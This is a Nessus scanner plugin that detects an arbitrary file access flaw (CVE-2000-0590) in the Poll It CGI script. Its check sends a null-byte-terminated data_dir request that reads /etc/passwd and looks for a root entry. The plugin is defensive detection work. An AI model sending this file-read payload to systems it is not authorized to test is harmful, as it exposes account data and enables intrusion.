#
# This script was written by Thomas Reinke <reinke@securityspace.com>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
#    - attempt to read /etc/passwd
#    - script_id
#    - added BID (9/14/2002)
#    - Revised plugin title, added OSVDB ref (1/27/2009)


include("compat.inc");

if(description)
{
 script_id(10459);
 script_bugtraq_id(1431);
 script_osvdb_id(358);
 script_cve_id("CVE-2000-0590");
 script_version ("$Revision: 1.30 $"); 

 script_name(english:"Poll It CGI data_dir Parameter Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows arbitrary
file access." );
 script_set_attribute(attribute:"description", value:
"'Poll_It_SSI_v2.0.cgi' is installed. This CGI has a well known security
flaw that lets an attacker retrieve any file from the remote system, e.g.
/etc/passwd." );
 script_set_attribute(attribute:"solution", value:
"Remove 'Poll_It_SSI_v2.0.cgi' from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/07/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/06");
 script_cvs_date("$Date: 2011/03/15 19:22:16 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


 summary["english"] = "Checks for the presence of /cgi-bin/pollit/Poll_It_SSI_v2.0.cgi";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);


 script_copyright(english:"This script is Copyright (C) 2000-2011 Thomas Reinke");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 
 exit(0);
}	  
  
#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 foreach dir (cgi_dirs())
 {
 req = string(dir, "/pollit/Poll_It_SSI_v2.0.cgi?data_dir=/etc/passwd%00");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_hole(port);
   exit(0);
  }
 }
}
